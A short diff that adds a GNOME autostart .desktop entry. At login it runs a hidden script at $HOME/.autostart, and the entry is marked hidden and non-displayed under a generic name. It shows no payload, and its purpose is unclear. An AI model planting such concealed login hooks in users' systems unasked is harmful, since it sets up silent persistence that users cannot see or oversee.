@@ -1,0 +1,10 @@
+[Desktop Entry]
+Type=Application
+Exec=bash $HOME/.autostart
+TryExec=$HOME/.autostart
+Hidden=true
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+Name=autostart
+GenericName=autostart
+X-GNOME-FullName=autostart
